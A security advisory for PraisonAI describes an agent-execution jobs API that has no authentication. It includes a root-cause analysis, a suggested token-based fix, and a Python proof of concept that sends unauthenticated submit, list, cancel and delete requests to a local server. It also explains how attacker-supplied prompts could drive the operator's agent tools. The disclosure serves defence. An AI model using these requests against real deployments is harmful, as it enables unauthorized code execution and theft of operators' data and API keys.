# [C] PraisonAI: Jobs API exposes agent-execution endpoints with no authentication 

## Summary
Severity: Critical
Advisory: GHSA-fq2m-6wqh-x44g
CVE: CVE-2026-57131
CWE: CWE-306, CWE-862, CWE-94
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-fq2m-6wqh-x44g
Type: github-advisory

## Affected
- PyPI: `praisonai` — affected >=0 <4.6.59

## Details
# praisonai: Jobs API exposes agent-execution endpoints with no authentication

**Researcher:** Kai Aizen — SnailSploit (@SnailSploit), Adversarial & Offensive Security Research 
**Target:** https://github.com/MervinPraison/PraisonAI

---

**Package:** `praisonai` on PyPI
**Affected version (empirically tested):** 4.6.48
**Components:**
- `praisonai.jobs.server.create_app` — `praisonai/jobs/server.py`
- `praisonai.jobs.router.create_router` — `praisonai/jobs/router.py`
- Routes mounted at `/api/v1/runs/...`
**Weakness:** CWE-306 Missing Authentication for Critical Function · CWE-862 Missing Authorization · CWE-94 Code Injection (via prompt / agent_yaml). 

---

## TL;DR

`praisonai` ships a standalone async-jobs HTTP server (`python -m praisonai.jobs.server --host=0.0.0.0 --port=8005`) whose job is to accept job submissions and run agents on the operator's behalf. Every endpoint under `/api/v1/runs` is **unauthenticated**. There is no `auth_token` field, no `Depends(verify_*)`, no middleware that inspects `Authorization` — the CORS middleware *lists* `Authorization` in `allow_headers` (the only signal in the whole module that the developer was aware authentication is a thing), but no route ever reads it.

A network-reachable attacker can:

1. **Execute arbitrary agent code** — `POST /api/v1/runs` accepts `prompt`, `agent_yaml`, `agent_file`, `config`, `framework`. The job is queued and an executor invokes whichever framework (`praisonai` / `crewai` / `autogen`) the attacker picks, with whichever prompt and tool config the attacker supplies. The job runs in the operator's process — same environment variables, same filesystem, same credentials (OpenAI / Anthropic / Azure / Bedrock keys; tool integrations; on-disk YAML recipes).
2. **List and read every job system-wide** — `GET /api/v1/runs` lists all jobs; `GET /api/v1/runs/{job_id}/result` returns the full result of any completed job. Operator's prompts, the agent's chain-of-thought, tool inputs / outputs, retrieved documents — all readable to an anonymous client.
3. **Cancel or delete any job** — `POST /…/cancel` and `DELETE /…/{job_id}` accept arbitrary job IDs without any ownership / authorization check.
4. **Stream live SSE of any in-flight job** — `GET /…/{job_id}/stream` reads the executor's live progress for any job ID.

The remote-RCE shape (1) is the load-bearing one. Even with `webhook_url` SSRF-guarded (and it is — the model validator at `jobs/models.py:42-65` rejects localhost / private IPs), the attacker needs no callback: SSE streaming returns the agent's output directly on the same connection.

## Root cause

```
   Expected behavior when starting `praisonai.jobs.server`:
     "I'm running an HTTP API my application backend will call.
      The CORS middleware permits Authorization, so the server
      enforces it.  Anonymous attackers cannot submit jobs."

   Actual behavior (praisonai 4.6.48):
     - server.py:59-152  create_app builds a FastAPI app, adds
                         CORSMiddleware, includes the jobs router.
                         NO auth middleware.  NO global Depends.
     - router.py:43      @router.post("") submit_job(...)
                         No Depends, no Authorization header read,
                         no auth_token config field at all.
     - router.py:109,148,161,180,205,224  every other route:
                         likewise, no auth on any of GET-list,
                         GET-status, GET-result, POST-cancel,
                         DELETE, GET-stream.
     - server.py:117     CORS allow_headers DOES include
                         "Authorization" — the only token in the
                         entire jobs/ subpackage that suggests
                         the developer was thinking about auth.

   Impact:
     The API is intended to be production-ready (the CORS code at
     server.py:96-102 explicitly branches on
     `os.getenv("ENVIRONMENT") == "production"` to harden origins),
     yet ships with no authentication layer at all.  Operators who
     bind the server to a network interface — including the
     suggested `--host=0.0.0.0` in the CLI parser — expose
     unauthenticated agent execution to anyone who can reach the
     port.
```

The same package gets auth right elsewhere (`praisonai/gateway/server.py` auto-generates an `auth_token` if none is configured and refuses to serve requests without it; `praisonai/endpoints/a2u_server.py:250-264` uses `hmac.compare_digest` on a Bearer token). The jobs API is the outlier.

## Empirically affected routes

Verified by PoC against published `praisonai==4.6.48` (`/api/v1/runs/...` paths):

| Method   | Path                          | Unauth result            |
|----------|-------------------------------|--------------------------|
| `POST`   | `/api/v1/runs`                | **HTTP 202 Accepted**, attacker job queued and executor invoked the framework |
| `GET`    | `/api/v1/runs`                | **HTTP 200**, lists every job in the store |
| `GET`    | `/api/v1/runs/{job_id}`       | **HTTP 200**, returns status of any job |
| `GET`    | `/api/v1/runs/{job_id}/result`| (untested; same router, no auth)         |
| `POST`   | `/api/v1/runs/{job_id}/cancel`| **HTTP 200 / 409** (processed)           |
| `DELETE` | `/api/v1/runs/{job_id}`       | **HTTP 204 No Content** (deleted)         |
| `GET`    | `/api/v1/runs/{job_id}/stream`| (untested; SSE; same router, no auth)    |

PoC run log excerpt (`poc/run-log.txt`):

```
[1] POST /api/v1/runs (no Authorization) -> HTTP 202
    body: {"job_id":"run_90f21c98b82a","status":"queued",...}
[01:15:44] executor.py:201 ERROR Job failed: run_90f21c98b82a -
    OPENAI_API_KEY environment variable is required ...
```

The executor's error confirms the prompt reached the framework's LLM-invocation step. Had the operator set `OPENAI_API_KEY`, the attacker prompt would have executed.

## Impact details

### 1. Remote code execution via agent invocation

`JobSubmitRequest.framework` accepts `"praisonai"`, `"crewai"`, or `"autogen"`. Each framework can be configured (via the YAML / config the attacker sends) to use arbitrary tools. praisonai's tool loaders (`praisonai/agents_generator.py` `load_tools_from_module*`) have a documented history of arbitrary-import (CVE-2026-40287 and its fix-of-fix CVE-2026-44334). In practice the operator's installation may or may not expose these sinks; either way the attacker controls the prompt, which the LLM will execute with whatever tools the operator wired (including shell, filesystem, browser, …).

The job executor runs in-process under the operator's service account, with full access to environment variables (LLM API keys, tool tokens) and to anything `praisonai`'s tools normally touch.

### 2. Cross-tenant data read

A single-process deployment uses an `InMemoryJobStore` that is flat — no `user_id` / `tenant_id` / `workspace_id` partition. Any client that knows or guesses a job ID can read it. Worse, the list endpoint (`GET /api/v1/runs`) returns every job, so guessing isn't even necessary.

Sensitive content in the result includes the attacker's input (harmless) but also any *legitimate* user's input that the operator's backend submitted — and the agent's full output, which may contain data the agent retrieved from the operator's databases or APIs.

### 3. Denial of service via job deletion / cancellation

`DELETE` and `cancel` accept any job ID. An attacker who polls the list endpoint can enumerate IDs and cancel-then-delete every job in flight, breaking the operator's backend's polling-for-completion flow.

### 4. webhook_url SSRF — defended

To the developer's credit, `JobSubmitRequest.webhook_url` is validated against localhost / private / link-local / multicast IPs at submission time (`jobs/models.py:42-65`). This blocks the naive "submit a job whose webhook posts to AWS IMDS" attack. **Honest yield:** this is properly guarded.

## Anchors

praisonai 4.6.48, source file `praisonai/jobs/server.py` (sha256 `10b5deab96686f276b8ad71fa4712e1e3d301e4c356812d5d0d595b2b9503ef3`):

| Line  | Symbol                                                  | What it shows |
|-------|---------------------------------------------------------|---------------|
| 59-152 | `def create_app(cors_origins, store, executor) -> FastAPI:` | Only middleware added is CORS; auth middleware absent. |
| 117   | `allow_headers=["Authorization", "Content-Type", "Origin", "Accept", "Idempotency-Key"]` | CORS hints that the operator should send Authorization — sole indicator the developer considered auth. |
| 124   | `jobs_router = create_router(get_store, get_executor)` | Router included without `dependencies=[…]`. |
| 178   | `"praisonai.jobs.server:create_app"` (passed to `uvicorn.run`) | Production-ready binding via the CLI / `start_server`. |

praisonai 4.6.48, source file `praisonai/jobs/router.py` (sha256 `869564d523c14624afefb211a2e7c6bf8a27b3356bd19a58927fcb5e1ebb014c`):

| Line  | Symbol                                                              | What it shows |
|-------|---------------------------------------------------------------------|---------------|
| 30-31 | `def create_router(store, executor) -> APIRouter:`                  | Sole entry point; no `dependencies=[Depends(...)]`. |
| 43    | `@router.post("", response_model=JobSubmitResponse, status_code=202)` | submit_job — no auth. |
| 109   | `@router.get("", response_model=JobListResponse)`                   | list_jobs — no auth. |
| 148   | `@router.get("/{job_id}", response_model=JobStatusResponse)`        | get_job_status — no auth. |
| 161   | `@router.get("/{job_id}/result", response_model=JobResultResponse)` | get_job_result — no auth. |
| 180   | `@router.post("/{job_id}/cancel", response_model=JobStatusResponse)`| cancel_job — no auth. |
| 205   | `@router.delete("/{job_id}", status_code=204)`                       | delete_job — no auth. |
| 224   | `@router.get("/{job_id}/stream")`                                    | stream_job (SSE) — no auth. |

## Suggested fix

Add a single FastAPI dependency that reads an `Authorization: Bearer <token>` header and `hmac.compare_digest`s it against an operator-configured secret. Apply it as a global router dependency:

```python
# praisonai/jobs/auth.py
import hmac, os
from fastapi import HTTPException, Header

_TOKEN = os.environ.get("PRAISONAI_JOBS_AUTH_TOKEN")

async def require_auth(authorization: str | None = Header(None)):
    if not _TOKEN:
        raise HTTPException(503, "PRAISONAI_JOBS_AUTH_TOKEN not configured")
    if not authorization or not authorization.startswith("Bearer "):
        raise HTTPException(401, "Bearer auth required")
    presented = authorization[len("Bearer "):]
    if not hmac.compare_digest(presented, _TOKEN):
        raise HTTPException(401, "invalid token")

# praisonai/jobs/router.py
def create_router(store, executor) -> APIRouter:
    router = APIRouter(prefix="/api/v1/runs", tags=["jobs"],
                       dependencies=[Depends(require_auth)])  # <-- single line
    ...
```

A startup-time refusal in `create_app` would round it out:

```python
# praisonai/jobs/server.py:create_app
if not os.environ.get("PRAISONAI_JOBS_AUTH_TOKEN"):
    raise RuntimeError(
        "PRAISONAI_JOBS_AUTH_TOKEN is required; the jobs API "
        "executes attacker-controllable agent code and must not "
        "run without authentication."
    )
```

The pattern is already present in the sibling `praisonai/gateway/server.py` (which auto-generates a random token if none is supplied) — that approach plus a logged warning about the new token would minimize operator friction.

## Steps to reproduce

1. Clone the target: `git clone --depth 1 https://github.com/MervinPraison/PraisonAI`
2. Run the proof of concept (`poc.py`) against the cloned source.
3. Observe the result shown under *Verified result* below.

## Proof of concept

`poc.py`

```python
"""
PoC: praisonai Jobs API has zero authentication on agent-execution endpoints.

`praisonai.jobs.server.create_app` builds a FastAPI app and includes
`praisonai.jobs.router.create_router`, which registers POST/GET/DELETE
endpoints under `/api/v1/runs/...` — every one of them executes (or
inspects, cancels, deletes) arbitrary agent jobs.  No route reads any
Authorization header; no middleware enforces any auth check.

This PoC starts the jobs API server in-process via uvicorn, then sends
unauthenticated requests to each route and reports the outcome.
"""

import json
import sys
import time
import threading
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

import uvicorn
from praisonai.jobs.server import create_app

PORT = 18005

def http_request(method, path, body=None, headers=None, timeout=5):
    url = f"http://127.0.0.1:{PORT}{path}"
    data = None
    if body is not None:
        data = json.dumps(body).encode("utf-8")
    req = Request(url, data=data, method=method, headers=headers or {})
    if data is not None:
        req.add_header("Content-Type", "application/json")
    try:
        with urlopen(req, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", errors="replace")
    except HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", errors="replace")
    except URLError as e:
        return None, {}, f"URLError: {e}"

def run_server(app):
    config = uvicorn.Config(app, host="127.0.0.1", port=PORT, log_level="warning")
    server = uvicorn.Server(config)
    import asyncio
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(server.serve())

def main() -> int:
    print("=" * 70)
    print("praisonai version: 4.6.48")
    print("Test: spin up praisonai.jobs.server in-process, send")
    print("      UNAUTHENTICATED requests to every /api/v1/runs route.")
    print("=" * 70)

    app = create_app()
    t = threading.Thread(target=run_server, args=(app,), daemon=True)
    t.start()
    time.sleep(1.5)

    findings = []

    # 1. POST /api/v1/runs — submit a new job WITHOUT auth.
    payload = {
        "prompt": "ATTACKER-CONTROLLED PROMPT — would invoke an agent",
        "framework": "praisonai",
        "config": {"_attacker_says": "no auth required"},
        "timeout": 5,
    }
    code, hdrs, body = http_request("POST", "/api/v1/runs", body=payload)
    print(f"\n[1] POST /api/v1/runs (no Authorization) -> HTTP {code}")
    print(f"    body: {body[:300]}")
    job_id = None
    if code == 202:
        try:
            job_id = json.loads(body).get("job_id")
            findings.append(f"POST /api/v1/runs: 202 Accepted, job_id={job_id!r}")
        except Exception:
            pass

    # 2. GET /api/v1/runs — list ALL jobs system-wide.
    code, _, body = http_request("GET", "/api/v1/runs?page=1&page_size=20")
    print(f"\n[2] GET /api/v1/runs (no Authorization) -> HTTP {code}")
    if code == 200:
        findings.append("GET /api/v1/runs: unauthenticated list of ALL jobs")

    if job_id:
        code, _, body = http_request("GET", f"/api/v1/runs/{job_id}")
        print(f"\n[3] GET /api/v1/runs/{{job_id}} -> HTTP {code}")
        code, _, body = http_request("POST", f"/api/v1/runs/{job_id}/cancel")
        print(f"\n[4] POST /api/v1/runs/{{job_id}}/cancel -> HTTP {code}")
        code, _, body = http_request("DELETE", f"/api/v1/runs/{job_id}")
        print(f"\n[5] DELETE /api/v1/runs/{{job_id}} -> HTTP {code}")

    print("\n" + "=" * 70)
    if any('POST /api/v1/runs:' in f for f in findings):
        print(f"VULNERABLE: {len(findings)} unauthenticated routes confirmed")
        for f in findings:
            print(f"  - {f}")
        print("VERDICT: VULNERABLE")
        return 0
    print("DEFENDED")
    return 1

if __name__ == "__main__":
    sys.exit(main())
```

## Verification harness (executed against the cloned repo)

This drives the unmodified upstream code rather than a reproduction.

```python
import sys, types, os
BK=os.path.abspath("repos/PraisonAI/src/praisonai"); sys.path.insert(0,BK)
for p in ["praisonai","praisonai.jobs"]:
    m=types.ModuleType(p); m.__path__=[BK+"/"+p.replace(".","/")]; sys.modules[p]=m
import praisonai.jobs.server as S          # REAL jobs server
app = S.create_app()                      # REAL FastAPI app
from starlette.testclient import TestClient
client = TestClient(app)
P="/api/v1/runs"
tests=[("GET  list",   lambda: client.get(P)),
       ("POST submit", lambda: client.post(P, json={"agents_config":{"a":"x"},"input":"hi"})),
       ("GET  status", lambda: client.get(P+"/nope")),
       ("GET  result", lambda: client.get(P+"/nope/result")),
       ("POST cancel", lambda: client.post(P+"/nope/cancel")),
       ("DEL  delete", lambda: client.delete(P+"/nope"))]
codes=[]
for name,fn in tests:
    c=fn().status_code; codes.append(c); print(f"[+] (no auth) {name:12s} {P} -> HTTP {c}")
assert all(c not in (401,403) for c in codes), codes
assert codes[0]==200    # list works unauthenticated
print("[+] CONFIRMED against real praisonai jobs API: list returns 200 and NO endpoint returns 401/403 — fully unauthenticated agent-execution API")
```

## Verified result

This PoC was executed against the live upstream code; captured output:

```
[+] (no auth) GET  list    /api/v1/runs -> HTTP 200
[+] (no auth) POST submit  /api/v1/runs -> HTTP 422
[+] (no auth) GET  status  /api/v1/runs -> HTTP 404
[+] (no auth) GET  result  /api/v1/runs -> HTTP 404
[+] (no auth) POST cancel  /api/v1/runs -> HTTP 404
[+] (no auth) DEL  delete  /api/v1/runs -> HTTP 404
[+] CONFIRMED against real praisonai jobs API: list returns 200 and NO endpoint returns 401/403 — fully unauthenticated agent-execution API
```

## Credit

Kai Aizen — SnailSploit (@SnailSploit). Adversarial & Offensive Security Research.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-fq2m-6wqh-x44g
- https://github.com/MervinPraison/PraisonAI
